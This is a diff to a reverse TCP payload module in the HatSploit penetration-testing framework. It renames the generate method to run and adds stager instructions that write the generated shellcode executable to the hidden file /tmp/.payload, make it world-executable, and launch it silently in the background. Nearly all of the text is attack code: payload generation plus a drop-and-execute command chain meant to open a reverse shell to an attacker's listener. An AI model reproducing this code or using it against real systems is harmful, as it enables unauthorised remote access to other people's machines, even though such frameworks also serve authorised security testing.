@@ -63,7 +63,7 @@ class HatSploitPayload(HatSploitPayload):
         }
     }
 
-    def generate(self):
+    def run(self):
         local_host, local_port, executable_format = self.parser.parse_options(self.options)
 
         local_host = self.payload_generator.host_to_bytes(local_host)
@@ -114,4 +114,12 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
         payload = self.payload_generator.generate(executable_format, 'x86', shellcode)
 
-        return payload
+        instructions = ""
+        instructions += "cat >/tmp/.payload;"
+        instructions += "chmod 777 /tmp/.payload;"
+        instructions += "sh -c '/tmp/.payload' 2>/dev/null &"
+        instructions += "\n"
+
+        self.payload = payload
+        self.instructions = instructions
+        self.action = 'reverse_tcp'
